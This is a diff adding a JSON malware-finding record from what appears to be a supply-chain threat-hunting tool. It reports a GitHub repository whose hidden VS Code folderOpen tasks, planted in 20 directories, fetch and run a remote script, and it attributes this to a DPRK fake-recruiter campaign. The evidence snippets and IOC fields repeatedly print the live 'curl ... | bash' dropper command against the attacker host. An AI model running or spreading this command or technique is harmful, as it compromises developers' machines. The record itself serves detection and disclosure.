@@ -1,0 +1,198 @@
+{
+  "finding": {
+    "key": "repository:kreliannn/mobile-web-view",
+    "kind": "repository",
+    "family": "",
+    "id": "kreliannn/mobile-web-view",
+    "url": "https://github.com/Kreliannn/mobile-web-view",
+    "registry": "github",
+    "owner": "kreliannn",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 6,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0; gradle/.vscode/tasks.json:0; gradle/wrapper/.vscode/tasks.json:0; app/.vscode/tasks.json:0; app/src/.vscode/tasks.json:0; app/src/main/.vscode/tasks.json:0; app/src/main/res/.vscode/tasks.json:0; app/src/main/res/xml/.vscode/tasks.json:0; app/src/main/res/values-night/.vscode/tasks.json:0; app/src/main/res/values/.vscode/tasks.json:0; app/src/main/res/mipmap-xxxhdpi/.vscode/tasks.json:0; app/src/main/res/mipmap-xxhdpi/.vscode/tasks.json:0; app/src/main/res/mipmap-xhdpi/.vscode/tasks.json:0; app/src/main/res/mipmap-mdpi/.vscode/tasks.json:0; app/src/main/res/mipmap-hdpi/.vscode/tasks.json:0; app/src/main/res/mipmap-anydpi-v26/.vscode/tasks.json:0; app/src/main/res/layout/.vscode/tasks.json:0; app/src/main/res/drawable/.vscode/tasks.json:0; app/src/main/java/.vscode/tasks.json:0; app/src/main/java/com/.vscode/tasks.json:0",
+    "c2_hosts": "default-configuration.vercel.app",
+    "iocs": "default-configuration.vercel.app; https://default-configuration.vercel.app/settings/linux?flag=9-test; curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "repository under owner Kreliannn of a known-malicious repo | Tier-2 confirmed (bash score 5)",
+    "osm_status": "submitted",
+    "osm_threat_id": "98766b6c-2322-465c-8c7c-88a8e96d1853",
+    "first_seen": "hunt-20260702T051729Z",
+    "last_seen": "hunt-20260702T051729Z",
+    "evidence_file": "repositories/kreliannn_mobile-web-view.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "gradle/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "gradle/wrapper/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/xml/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/values-night/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/values/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/mipmap-xxxhdpi/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/mipmap-xxhdpi/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/mipmap-xhdpi/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/mipmap-mdpi/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/mipmap-hdpi/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/mipmap-anydpi-v26/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/layout/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/res/drawable/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/java/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "app/src/main/java/com/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/kreliannn/mobile-web-view",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json, gradle/.vscode/tasks.json, gradle/wrapper/.vscode/tasks.json and 17 more files.\nOutbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, gradle/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 20 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration.vercel.app.\nCampaign GW-C-498a0aeb: one of 89 confirmed repos across 14 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 3 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, vscode-extension-260120.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json, gradle/.vscode/tasks.json, gradle/wrapper/.vscode/tasks.json, app/.vscode/tasks.json, app/src/.vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, gradle/.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed (+19 more)\n- Attacker hosts: default-configuration.vercel.app",
+    "publisher": "kreliannn",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "polinrider",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/kreliannn/mobile-web-view/blob/HEAD/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/gradle/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/gradle/wrapper/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/main/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/main/res/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/main/res/xml/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/main/res/values-night/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/main/res/values/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/main/res/mipmap-xxxhdpi/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/main/res/mipmap-xxhdpi/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/main/res/mipmap-xhdpi/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/main/res/mipmap-mdpi/.vscode/tasks.json\nhttps://github.com/kreliannn/mobile-web-view/blob/HEAD/app/src/main/res/mipmap-hdpi/.vscode/tasks.json",
+    "verified_iocs": "default-configuration.vercel.app\nhttps://default-configuration.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-02T05:17:29Z",
+    "last_seen": "2026-07-02T05:17:29Z"
+  }
+}
